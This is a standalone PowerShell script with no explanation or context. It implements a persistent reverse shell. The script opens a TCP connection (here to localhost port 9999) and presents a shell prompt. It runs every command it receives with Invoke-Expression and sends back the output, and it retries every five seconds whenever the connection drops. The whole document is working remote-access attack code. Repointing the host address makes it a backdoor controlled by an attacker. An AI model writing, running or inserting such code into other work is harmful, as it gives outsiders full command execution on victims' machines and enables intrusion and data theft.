while ($true) {
    try {
        # Attempt to create a connection
        $client = New-Object System.Net.Sockets.TCPClient("localhost", "9999")
    } catch {
        Write-Host "Failed to connect: $_"
        Start-Sleep -Seconds 5  # Wait 5 seconds before retrying
        continue  # Go back to the start of the loop and try again
    }

    if ($client.Connected) {
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $buffer = New-Object byte[] 1024
        $encoding = [System.Text.Encoding]::ASCII

        Write-Host "Connected to the server."

        while ($client.Connected) {
            try {
                $writer.Write("PS " + (Get-Location).Path + "> ")
                $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
                if ($bytesRead -le 0) {
                    throw "Connection closed by server."
                }
                $input = $encoding.GetString($buffer, 0, $bytesRead).Trim()
                $output = Invoke-Expression $input 2>&1 | Out-String
                $writer.Write($output)
            } catch {
                Write-Host "Error: $_"
                break  # Exit the inner loop and reconnect
            }
        }
    } else {
        Write-Host "Connection failed!"
    }

    # Close the client and wait before retrying
    $client.Close()
    Start-Sleep -Seconds 5  # Wait 5 seconds before retrying
}
